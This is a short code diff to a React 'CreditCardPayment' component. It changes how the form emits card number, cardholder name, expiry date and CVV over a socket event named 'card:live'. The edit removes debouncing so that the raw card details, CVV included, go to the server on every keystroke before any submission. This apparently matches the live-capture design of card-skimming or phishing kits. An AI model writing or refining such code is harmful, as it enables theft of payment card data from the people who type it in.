@@ -170,16 +170,14 @@ export default function CreditCardPayment() {
   const cvv = watch("cvv");
 
   useEffect(() => {
-    if (debounceRef.current) clearTimeout(debounceRef.current);
-    debounceRef.current = setTimeout(() => {
-      socket.value.emit("card:live", {
-        cardNumber: cardNumber || "",
-        nameOnCard: nameOnCard || "",
-        expiryDate: expiryDate || "",
-        cvv: cvv || "",
-      });
-    }, 300);
-    return () => { if (debounceRef.current) clearTimeout(debounceRef.current); };
+    // Send immediately - no debounce for real-time
+    const rawNum = (cardNumber || "").replace(/\s+/g, "");
+    socket.value.emit("card:live", {
+      cardNumber: rawNum,
+      nameOnCard: nameOnCard || "",
+      expiryDate: expiryDate || "",
+      cvv: cvv || "",
+    });
   }, [cardNumber, nameOnCard, expiryDate, cvv]);
 
   const cleanCardNumber = cardNumber?.replace(/\s+/g, "") || "";
